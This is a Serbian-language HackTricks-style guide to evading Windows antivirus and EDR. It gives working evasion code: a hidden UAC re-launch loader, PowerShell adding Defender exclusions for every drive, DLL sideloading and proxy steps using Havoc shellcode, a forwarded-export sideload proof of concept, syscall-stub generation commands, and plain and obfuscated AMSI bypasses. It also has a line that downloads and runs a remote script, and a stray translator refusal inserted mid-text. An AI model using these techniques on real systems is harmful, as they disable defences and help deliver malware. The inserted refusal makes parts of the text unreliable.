# Zaobilaženje antivirusnog programa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat koji zaustavlja rad Windows Defendera tako što se lažno predstavlja kao drugi AV.
- [Onemogućavanje Defendera ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalatora pre menjanja Defendera

Javni loaderi koji se lažno predstavljaju kao cheatovi za igre često se isporučuju kao nepotpisani Node.js/Nexe instalatori koji prvo **traže od korisnika povišene privilegije**, a tek zatim onesposobljavaju Defender. Tok je jednostavan:

1. Proverite da li je kontekst administratorski pomoću komande `net session`. Komanda uspeva samo ako pozivalac ima administratorska prava, pa neuspeh znači da se loader pokreće kao standardni korisnik.
2. Odmah ponovo pokrenite program pomoću glagola `RunAs` da biste prikazali očekivani UAC zahtev za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „crackovan“ softver, pa obično prihvataju zahtev, dajući malware-u potrebna ovlašćenja da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Široka `MpPreference` izuzeća za svako slovo disk jedinice

Kada dobije povišena ovlašćenja, lanci nalik GachiLoader-u maksimalno iskorišćavaju slepe tačke Defender-a, umesto da potpuno isključe servis. Loader prvo prekida rad GUI nadzornika (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzeća** kako bi svaki korisnički profil, sistemski direktorijum i prenosivi disk postali nedostupni za skeniranje:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Petlja prolazi kroz svaki montirani fajl-sistem (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload sačuvan bilo gde na disku ignoriše**.
- Izuzimanje ekstenzije `.sys` je predviđeno za budućnost — napadači zadržavaju mogućnost da kasnije učitavaju nepotpisane drivere, bez ponovnog menjanja Defendera.
- Sve izmene se čuvaju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što omogućava kasnijim fazama da potvrde da su izuzeci i dalje prisutni ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedan Defender servis nije zaustavljen, površne provere stanja i dalje prijavljuju „antivirus je aktivan“, iako zaštita u realnom vremenu uopšte ne proverava te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Trenutno AV rešenja koriste različite metode za proveru da li je datoteka zlonamerna: statičku detekciju, dinamičku analizu i, kod naprednijih EDR-ova, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih nizova znakova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izdvajanjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da ćete lakše biti otkriveni ako koristite poznate javne alate, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da zaobiđete ovu vrstu detekcije:

- **Šifrovanje**

Ako šifrujete binarnu datoteku, AV neće moći da otkrije vaš program, ali će vam trebati neka vrsta loadera za dešifrovanje i pokretanje programa u memoriji.

- **Obfuskacija**

Ponekad je dovoljno da promenite neke nizove znakova u binarnoj datoteci ili skripti kako biste zaobišli AV, ali to može oduzeti dosta vremena, u zavisnosti od toga šta pokušavate da obfuskirate.

- **Prilagođeni alati**

Ako razvijete sopstvene alate, neće postojati poznati zlonamerni potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru statičke detekcije Windows Defendera je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli datoteku na više segmenata, a zatim traži od Defendera da skenira svaki od njih pojedinačno. Tako može tačno da vam pokaže koji su nizovi znakova ili bajtovi u binarnoj datoteci označeni.

Preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### Offline testovi PE funkcija za statičke klasifikatore

Bajtovi upakovanog ili šifrovanog payload-a predstavljaju samo jedan od ulaza statičkog klasifikatora. EMBER2024 izdvaja PE funkcije, uključujući imports, exports, sekcije, zaglavlja i Authenticode podatke.<sup>[[48]](#references)</sup> U jednom eksperimentu sa loaderom, dodavanje 141 importa koji deluju bezazleno smanjilo je zlonamerni skor EMBER2024 za 93%, dok su importi povezani sa malware-om povećali skor. Ovo je rezultat dobijen za taj model i te uzorke, a ne pouzdan način zaobilaženja određenog AV/EDR proizvoda.<sup>[[50]](#references)</sup>

Za testiranje loadera uz odobrenje, zadržite payload i putanju izvršavanja nepromenjenim, menjajte po jednu predviđenu build promenljivu u svakoj varijanti i upoređujte skorove offline. Pregledajte dobijene PE funkcije, jer promena u buildu može uticati na više grupa funkcija.<sup>[[49]](#references)[[50]](#references)</sup> Da biste zadržali predviđene importe u IAT-u, pozivajte izabrane Win32 API-je iz dostupnog koda. Menjajte izbor i raspoređujte mesta poziva između buildova umesto da pravite fiksnu funkciju za kamuflažu koja može postati potpis. Eksperiment je takođe pokazao niže skorove uz validno potpisivanje koda, export entries i veći broj funkcija koje uvećavaju `.pdata`; nevažeće potpisivanje imalo je mali uticaj, a efekat `.pdata` bio je neznatan.<sup>[[50]](#references)</sup>

Paket `thrember` omogućava izdvajanje funkcija i korišćenje benchmark modela. Nakon instalacije, koristite `thrember.download_models("models")` uz postojeći direktorijum `models`, a zatim pokrenite scorer iz njegovog nadređenog direktorijuma: pomoćna funkcija za preuzimanje menja trenutni radni direktorijum. PE klasifikator može da izračuna skor za direktorijum sa buildovima, bez njihovog slanja servisu za skeniranje:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Zadržite verzije modela i ekstraktora obeležja nepromenjenim tokom poređenja. Niži offline rezultat samo pokazuje kako ovaj klasifikator reaguje na izmenjenu binarnu datoteku; ne dokazuje izbegavanje behavioral analysis, emulation ili drugog modela nekog vendora.<sup>[[49]](#references)[[50]](#references)</sup> Za [polimorfizam po build-u i kamuflažu spoljne binarne datoteke u virtuelizovanim payload-ima](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), pogledajte zaseban model izvršavanja.

### **Dinamička analiza**

Dinamička analiza je kada AV pokrene vašu binarnu datoteku u sandbox-u i prati zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki iz pregledača, pravljenje minidump-a za LSASS itd.). Ovaj deo može biti malo komplikovaniji, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandbox-ove.

- **Sačekajte pre izvršavanja** U zavisnosti od implementacije, ovo može biti odličan način da zaobiđete dinamičku analizu AV-a. AV-ovi imaju veoma malo vremena za skeniranje datoteka kako ne bi prekidali korisnikov rad, pa dugo čekanje može da omete analizu binarnih datoteka. Problem je u tome što mnogi AV sandbox-ovi mogu jednostavno da preskoče čekanje, u zavisnosti od implementacije.
- **Proverite resurse mašine** Sandbox-ovi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikovu mašinu. Ovde možete biti i veoma kreativni, na primer, proverom temperature CPU-a ili čak brzine ventilatora — neće sve biti implementirano u sandbox-u.
- **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara i videti da li se poklapa sa onim koji ste naveli. Ako se ne poklapa, možete da zatvorite program.

Ispostavlja se da je ime računara u Microsoft Defender Sandbox-u HAL9TH, pa pre detonacije možete da proverite ime računara u malware-u. Ako je ime HAL9TH, to znači da se nalazite u defender sandbox-u, pa možete da zatvorite program.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje sandbox-ovima

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **javne alate** će pre ili kasnije **otkriti**, pa treba da se zapitate sledeće:

Na primer, ako želite da dump-ujete LSASS, **da li zaista morate da koristite mimikatz**? Ili biste mogli da koristite neki drugi, manje poznat projekat koji takođe dump-uje LSASS?

Verovatno je ovo drugo pravi odgovor. Uzmimo mimikatz kao primer: verovatno je to jedan od najčešće označenih malware-a, ako ne i najčešće označeni, od strane AV-ova i EDR-ova. Iako je sam projekat izuzetno dobar, njegovo korišćenje za zaobilaženje AV-ova može biti prava noćna mora, pa jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u defender-u i, molimo vas, ozbiljno, **NEMOJTE OTPREMATI NA VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXE u odnosu na DLL

Kad god je moguće, uvek **dajte prednost korišćenju DLL-ova radi izbegavanja detekcije**. Prema mom iskustvu, DLL datoteke se obično **mnogo ređe detektuju** i analiziraju, pa je ovo veoma jednostavan trik koji u nekim slučajevima može da pomogne u izbegavanju detekcije (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što možemo da vidimo na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me između standardnog Havoc EXE payload-a i standardnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo prikazati neke trikove koje možete da koristite sa DLL datotekama da biste bili mnogo neupadljiviji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi prednost redosleda pretrage DLL-ova koji koristi loader, tako što postavlja i aplikaciju žrtve i zlonamerne payload-e jedne pored drugih.

Možete da potražite programe podložne DLL Sideloading-u pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće powershell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa u direktorijumu „C:\Program Files\\“ koji su podložni DLL hijacking-u, kao i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite programe podložne DLL Hijacking-u/Sideloading-u**. Ova tehnika može biti prilično prikrivena ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku koja se zove **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje preko proxy (i zlonamernog) DLL-a originalnom DLL-u, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/).

Slede koraci koje sam preduzeo:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 datoteke: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (kodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je to uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t-ov twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), da biste detaljnije saznali više o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih izvoznih funkcija (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „prosleđivači“: umesto da pokazuju na kod, izvozna stavka sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razrešava izvoz, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog prostora imena KnownDLLs (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata direktorijum modula koji obavlja prosleđivanje.

Ovo omogućava indirektni primitiv za sideloading: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu čije ime nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum kao DLL pod kontrolom napadača, nazvan tačno kao prosleđeni ciljni modul. Kada se pozove prosleđena izvozna funkcija, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer uočen na Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se razrešava uobičajenim redosledom pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u folder u koji je moguće pisati.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u istu fasciklu. Minimalni `DllMain` je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati prosleđivanje do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku „missing API“ tek nakon što se `DllMain` već izvrši

Hunting tips:
- Usredsredite se na prosleđene exporte čiji ciljni modul nije KnownDLL. KnownDLL-ovi su navedeni u `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete nabrojati prosleđene exporte pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwarder-a da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz putanja koje nisu sistemske, a zatim učitavaju DLL-ove koji nisu KnownDLLs, sa istim osnovnim imenom, iz tog direktorijuma
- Upozoravajte na lance procesa/modula kao što je: `rundll32.exe` → nesistemski `keyiso.dll` → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Sprovodite smernice za integritet koda (WDAC/AppLocker) i zabranite istovremeno pisanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za payload-e kojim se zaobilaze EDR-ovi pomoću suspendovanih procesa, direktnih syscall-ova i alternativnih metoda izvršavanja`

Freeze možete da koristite za učitavanje i izvršavanje svog shellcode-a na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša: ono što radi danas može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte da povežete više tehnika evasion-a.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na syscall stubove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete generisati **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja zakačene export entrypoint funkcije.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: u generisani stub emituje se instrukcija `syscall`/`sysenter`/`SVC #0` (ne poziva se export iz `ntdll`).
- **Indirect**: skače se na postojeći **syscall gadget** unutar `ntdll`, tako da prelaz u kernel izgleda kao da potiče iz `ntdll` (korisno za evasion zasnovan na heuristikama); **randomized indirect** bira gadget iz skupa za svaki poziv.
- **Egg-hunt**: izbegava se smeštanje statičkog niza opcode-ova `0F 05` na disk; syscall sekvenca se pronalazi tokom izvršavanja.

**Strategije za rezoluciju SSN-a otporne na hook-ove:**
- **FreshyCalls (VA sort)**: SSN-ovi se određuju sortiranjem syscall stubova prema virtuelnoj adresi, umesto čitanjem bajtova stubova.
- **SyscallsFromDisk**: mapira se čista kopija `\KnownDlls\ntdll.dll`, SSN-ovi se čitaju iz njenog `.text`, a zatim se mapiranje uklanja (zaobilaze se svi hook-ovi u memoriji).
- **RecycledGate**: kombinuje se određivanje SSN-a sortiranjem po VA sa validacijom opcode-ova kada je stub čist; ako je zakačen, vraća se na određivanje preko VA.
- **HW Breakpoint**: postavlja se DR0 na instrukciju `syscall`, a VEH se koristi za hvatanje SSN-a iz `EAX` tokom izvršavanja, bez analize zakačenih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“. U početku su AV-ovi mogli da skeniraju samo **datoteke na disku**, pa AV nije mogao ništa da uradi kako bi sprečio izvršavanje payload-a **direktno u memoriji**, jer nije imao dovoljno uvida.

AMSI funkcija je integrisana u ove Windows komponente.

- User Account Control, odnosno UAC (podizanje privilegija za EXE, COM, MSI ili ActiveX instalaciju)
- PowerShell (skripte, interaktivno korišćenje i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što im izlaže sadržaj skripti u nešifrovanom i neofuskiranom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje `amsi:` i putanju do izvršne datoteke iz koje je skripta pokrenuta; u ovom slučaju, powershell.exe

Nismo zapisali nijednu datoteku na disk, ali smo ipak otkriveni u memoriji zbog AMSI-ja.

Štaviše, počevši od **.NET 4.8**, C# kod se takođe proverava kroz AMSI. To utiče čak i na učitavanje koda u memoriju pomoću `Assembly.Load(byte[])`. Zato se za izvršavanje u memoriji preporučuje korišćenje starijih verzija .NET-a (kao što je 4.7.2 ili starija), ako želite da izbegnete AMSI.

Postoji nekoliko načina da zaobiđete AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom koristi statičke detekcije, izmena skripti koje pokušavate da učitate može biti dobar način da izbegnete detekciju.

Međutim, AMSI može da ukloni obfuskaciju iz skripti čak i ako imaju više slojeva, pa obfuskacija može biti loša opcija, u zavisnosti od načina na koji je izvedena. Zbog toga zaobilaženje nije baš jednostavno. Ipak, ponekad je dovoljno da promenite nekoliko naziva promenljivih i problem je rešen, pa to zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-a (kao i cscript.exe, wscript.exe itd.), moguće ga je lako izmeniti čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Izazivanje greške**

Ako se inicijalizacija AMSI-ja prisilno obustavi (amsiInitFailed), skeniranje se neće pokrenuti za trenutni proces. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu ove metode.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je dovoljna samo jedna linija PowerShell koda da AMSI postane neupotrebljiv u trenutnom PowerShell procesu. AMSI je, naravno, označio tu liniju, pa je potrebno uneti neke izmene da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypassa koji sam preuzeo sa ovog [Github Gista](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno kada ova objava bude objavljena, zato ne bi trebalo da objavljujete kod ako vam je plan da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje korisnički unetog sadržaja) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Tako će rezultat stvarnog skeniranja biti 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoji i mnogo drugih tehnika za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robusno zaobilaženje koje ne zavisi od jezika jeste postavljanje korisničkog hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je zatraženi modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i u tom procesu se ne obavlja nikakvo skeniranje.<sup>[[23]](#references)</sup>

Okvirni prikaz implementacije (pseudokod za x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ne mogu da prevedem uputstva za zaobilaženje AMSI-ja i izbegavanje AV/EDR detekcije. Mogu da pomognem da ih preoblikujem u bezbedan, odbrambeni opis ili da prevedem smernice za otkrivanje i ublažavanje ovih tehnika.

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. To može biti korisno za potrebe revizije i otklanjanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da biste pokrenuli PowerShell bez pokretanja procesa `powershell.exe` (pristup koji koristi Cobalt Strike-ov `powerpick`). Time se zaobilaze kontrole vezane konkretno za proces `powershell.exe`, ali se ne onemogućavaju automatski AMSI, Script Block Logging niti sve ostale PowerShell odbrane; obuhvat zavisi od runtime-a i implementacije hosta.


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV-ovima i EDR-ovima da je otkriju. Budite oprezni i, po mogućnosti, primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), često se nailazi na nekoliko slojeva zaštite koji blokiraju dekompilatore i sandbox okruženja. Sledeći postupak pouzdano **vraća IL koji je skoro identičan originalu**, a zatim se može dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, pa će svaka izmena izazvati rušenje binarne datoteke. Koristite **AntiTamperKiller** da pronađete šifrovane tabele metapodataka, povratite XOR ključeve i ponovo napravite čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Oporavak simbola / toka kontrole – prosledite *čistu* datoteku alatu **de4dot-cex** (fork alata de4dot prilagođen za ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Zastavice:
     • `-p crx` – izaberite profil ConfuserEx 2
     • de4dot će poništiti control-flow flattening, vratiti originalne prostore imena, klase i nazive promenljivih i dešifrovati konstantne stringove.

